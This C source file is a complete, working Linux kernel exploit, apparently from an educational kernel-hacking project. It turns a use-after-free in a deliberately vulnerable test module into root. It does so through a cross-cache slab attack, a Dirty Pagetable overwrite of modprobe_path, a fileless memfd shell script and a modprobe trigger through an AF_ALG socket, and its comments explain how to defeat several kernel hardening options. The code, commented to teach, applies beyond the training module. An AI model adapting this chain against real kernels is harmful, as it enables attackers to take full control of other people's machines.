/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * (they don't break the implemented Dirty Pagetable attack)
 *   - CONFIG_PAGE_TABLE_CHECK
 * 
 * This PoC performs the Dirty Pagetable attack and gains LPE.
 *
 * Requirements:
 *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
 *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
 *  3) See "Kernel code" in /proc/iomem and update KERNEL_TEXT_PHYS_ADDR
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/if_alg.h>
#include <linux/limits.h>
#include "drill.h"

int do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #0\n");
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - prepare the page table infrastructure
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - create a page table to reclaim the freed memory
 *  - perform uaf write using the dangling reference
 *  - change modprobe_path using the overwritten page table
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

#define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
#define PMD_INDEX_TO_VIRT(i) ((unsigned long)i << 21)
#define PUD_INDEX_TO_VIRT(i) ((unsigned long)i << 30)
#define PGD_INDEX_TO_VIRT(i) ((unsigned long)i << 39)
#define PT_INDICES_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
		(void *)(PGD_INDEX_TO_VIRT(pgd_index) + \
			 PUD_INDEX_TO_VIRT(pud_index) + \
			 PMD_INDEX_TO_VIRT(pmd_index) + \
			 PTE_INDEX_TO_VIRT(pte_index) + \
			 (unsigned long)page_index)

#define PT_ENTRIES (PAGE_SIZE / 8)

/* Page table bits: Dirty | Accessed | User | Write | Present */
#define PT_BITS 0x67lu

#define PGD_N 64

#define MAGIC_VAL 0xc001c0ffeebadbadlu

int prepare_page_tables(void)
{
	unsigned long *addr = NULL;
	long i = 0;
	int fd;

	printf("[!] preparing page tables\n");

	/*
	 * We use the SHM file to freeze the memory once the PoC is finished.
	 * This allows us to bypass PAGE_TABLE_CHECK hardening when data is freed.
	 * Since the file exists after finishing, we never reach the page refcount check.
	 */
	fd = shm_open("/notavirus", O_CREAT | O_RDWR, 0666);
	if (fd < 0) {
		perror("shm_open");
		return EXIT_FAILURE;
	}

	if (ftruncate(fd, 4096) < 0) {
		perror("ftruncate");
		return EXIT_FAILURE;
	}
	/* Allocate page table hierarchy */
	addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
			  MAP_FIXED | MAP_SHARED, fd, 0);
	if (addr == MAP_FAILED) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}
	printf("[+] mmap 1: %p\n", addr);
	*addr = MAGIC_VAL;

	/*
	 * Prepare the resources for PTE that will later reclaim
	 * the freed slab containing UAF object.
	 */
	for (i = 0; i < PT_ENTRIES; i++) {
		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0), PAGE_SIZE, PROT_WRITE,
			    MAP_FIXED | MAP_SHARED, fd, 0);
		if (addr == MAP_FAILED) {
			perror("[-] mmap");
			return EXIT_FAILURE;
		}
	}
	printf("[+] mmap 2: from %p to %p\n",
			PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0),
			PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0));

	return EXIT_SUCCESS;
}

#define TLB_FLUSH_IN_PROGRESS 0
#define TLB_FLUSH_DONE 1

/* See https://pwning.tech/nftables/#47-tlb-flushing */
int flush_tlb(void *addr, size_t len)
{
	pid_t cpid = -1;
	pid_t w = -1;
	int wstatus = 0;

	cpid = fork();
	if (cpid < 0) {
		perror("[-] fork");
		return EXIT_FAILURE;
	}

	if (cpid == 0) {
		int ret = munmap(addr, len);

		if (ret < 0) {
			perror("[-] munmap");
			exit(EXIT_FAILURE);
		}

		exit(EXIT_SUCCESS);
	}

	w = waitpid(cpid, &wstatus, 0);
	if (w < 0) {
		perror("[-] waitpid");
		return EXIT_FAILURE;
	}

	if (!WIFEXITED(wstatus)) {
		printf("[-] child didn't exit normally\n");
		return EXIT_FAILURE;
	}

	if (WEXITSTATUS(wstatus) != EXIT_SUCCESS) {
		printf("[-] child failed\n");
		return EXIT_FAILURE;
	}

	printf("[+] TLB is flushed\n");

	return EXIT_SUCCESS;
}

/* Update the address of modprobe_path for your kernel: */
#define MODPROBE_PATH_ADDR 0xffffffff835a9f20lu
#define KERNEL_TEXT_ADDR 0xffffffff81000000lu
#define MODPROBE_PATH_ADDR_OFFSET (MODPROBE_PATH_ADDR - KERNEL_TEXT_ADDR)
/* See "Kernel code" in /proc/iomem to update KERNEL_TEXT_PHYS_ADDR for your kernel */
#define KERNEL_TEXT_PHYS_ADDR 0x1000000lu
#define MODPROBE_PATH_PHYS_ADDR (KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_ADDR_OFFSET)
#define MODPROBE_PATH_PTE_ENTRY ((MODPROBE_PATH_PHYS_ADDR & 0xfffffffffffff000lu) + PT_BITS)

/* From include/linux/kmod.h */
#define KMOD_PATH_LEN 256

int get_modprobe_path(char *buf, size_t buf_size)
{
	int fd = -1;
	ssize_t bytes = 0;
	int ret = EXIT_FAILURE;
	size_t len = 0;

	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (fd < 0) {
		perror("[-] open modprobe");
		return EXIT_FAILURE;
	}

	bytes = read(fd, buf, buf_size);
	buf[buf_size - 1] = 0;

	ret = close(fd);
	if (ret != 0)
		perror("[-] close modprobe");

	if (bytes < 0) {
		perror("[-] read modprobe");
		return EXIT_FAILURE;
	}

	len = strlen(buf);
	if (len < 1) {
		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	if (buf[len - 1] != '\n') {
		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	buf[len - 1] = 0; /* skip the line feed '\n' */

	return EXIT_SUCCESS;
}

void *memmem_modprobe_path(void *memory, size_t memory_size)
{
	int ret = EXIT_FAILURE;
	char modprobe_path[KMOD_PATH_LEN] = { 0 };
	size_t modprobe_path_len = 0;
	char *modprobe_path_uaddr = NULL;

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE)
		return NULL;

	printf("[!] original modprobe_path: %s\n", modprobe_path);

	if (modprobe_path[0] != '/') {
		printf("[-] unexpected modprobe_path\n");
		return NULL;
	}

	modprobe_path_len = strlen(modprobe_path);
	modprobe_path_uaddr = memmem(memory, memory_size, modprobe_path, modprobe_path_len);
	if (modprobe_path_uaddr == NULL) {
		printf("[-] modprobe_path is not found in memory pointed by corrupted PTE\n");
		return NULL;
	}
	printf("[+] found modprobe_path at %p\n", modprobe_path_uaddr);

	/* Test overwriting modprobe_path */
	modprobe_path_uaddr[0] = 'x';

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE)
		return NULL;

	/* Return the initial value back for now */
	modprobe_path_uaddr[0] = '/';

	if (modprobe_path[0] != 'x') {
		printf("[-] testing modprobe_path overwriting failed\n");
		return NULL;
	}

	printf("[+] testing modprobe_path overwriting succeeded\n");
	return modprobe_path_uaddr;
}

/* Fileless approach */
int prepare_privesc_script(char *path, size_t path_size)
{
	pid_t pid = getpid();
	int script_fd = -1;
	int shell_stdin_fd = -1;
	int shell_stdout_fd = -1;
	int ret = EXIT_FAILURE;

	script_fd = memfd_create("", MFD_CLOEXEC);
	if (script_fd < 0) {
		perror("[-] memfd_create");
		return EXIT_FAILURE;
	}

	shell_stdin_fd = dup(STDIN_FILENO);
	if (shell_stdin_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	shell_stdout_fd = dup(STDOUT_FILENO);
	if (shell_stdout_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	ret = dprintf(script_fd,
		      "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
		      pid, shell_stdin_fd,
		      pid, shell_stdout_fd);
	if (ret < 0) {
		perror("[-] dprintf for privesc_script");
		return EXIT_FAILURE;
	}

	ret = lseek(script_fd, 0, SEEK_SET);
	if (ret < 0) {
		perror("[-] lseek for privesc_script");
		return EXIT_FAILURE;
	}

	ret = snprintf(path, path_size, "/proc/%i/fd/%i", pid, script_fd);
	if (ret < 0) {
		perror("[-] snprintf for privesc_script path");
		return EXIT_FAILURE;
	}
	if (ret >= path_size) {
		printf("[-] snprintf for privesc_script path: truncated\n");
		return EXIT_FAILURE;
	}

	printf("[+] privesc script is prepared at %s\n", path);
	return EXIT_SUCCESS;
}

/* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
void trigger_modprobe_sock(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "dummy"
	};
	int alg_fd = -1;

	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
	printf("[!] root shell is finished\n");

	if (alg_fd >= 0) {
		if (close(alg_fd) < 0)
			perror("[-] close alg_fd");
	}
}

int main(void)
{
	int result = EXIT_FAILURE;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	char act_args[DRILL_ACT_SIZE] = { 0 };
	char privesc_script_path[KMOD_PATH_LEN] = { 0 };

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = prepare_page_tables();
	if (ret == EXIT_FAILURE)
		goto end;

	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning() == EXIT_FAILURE)
		goto end;

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go for page table\n");

	printf("[!] create a page table to reclaim the freed memory\n");
	for (i = 0; i < PT_ENTRIES; i++) {
		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);

		/* Allocate and populate a new PTE */
		*addr = MAGIC_VAL;
	}
	printf("[+] PTE has been created\n");

	printf("[!] perform uaf write using the dangling reference\n");
	/*
	 * Overwrite one entry in PTE, which reclaimed the UAF memory.
	 * It will point to the page containing modprobe_path.
	 * DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16.
	 */
	snprintf(act_args, sizeof(act_args), "0x%lx 0", MODPROBE_PATH_PTE_ENTRY);
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, act_args);
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
	if (ret == EXIT_FAILURE)
		goto end;

	for (i = 0; i < PT_ENTRIES; i++) {
		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
		unsigned long val = *addr;
		char *modprobe_path_uaddr = NULL;
		size_t new_len = 0;

		if (val == MAGIC_VAL)
			continue;

		printf("[+] corrupted PTE entry is detected, now search modprobe_path\n");
		modprobe_path_uaddr = memmem_modprobe_path(addr, PAGE_SIZE);
		if (modprobe_path_uaddr == NULL)
			goto repair;

		new_len = strlen(privesc_script_path);
		if (new_len + 1 > KMOD_PATH_LEN) {
			printf("[-] not enough bytes in modprobe_path\n");
			goto repair;
		}

		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);

		/* Launch the root shell */
		trigger_modprobe_sock();
		result = EXIT_SUCCESS;

repair:
		/* 
		 * Bypass the PAGE_TABLE_CHECK hardening when the page table is freed.
		 * To do so, we fill the page table entry with zeroes to skip memory freeing
		 * in zap_pud_range() (see pud_none_or_clear_bad()).
		 * This ensures that the page_table_check function is never reached for that entry
		 */
		act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");

		goto end; /* root shell is finished */
	}

	printf("[-] failed to find / overwrite / trigger modprobe\n");

end:
	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	return result;
}